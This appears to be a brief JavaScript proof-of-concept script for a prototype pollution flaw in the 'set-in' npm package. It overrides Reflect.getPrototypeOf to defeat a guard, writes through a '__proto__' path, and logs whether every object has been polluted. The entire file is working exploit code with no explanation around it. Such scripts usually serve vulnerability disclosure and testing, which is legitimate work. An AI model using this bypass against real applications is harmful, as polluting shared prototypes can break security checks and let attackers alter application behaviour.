Reflect.getPrototypeOf = () => false;
const si = require('set-in');
const obj = {};
console.log({}.polluted);
si(obj, [
    '__proto__',
    'polluted'
], 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');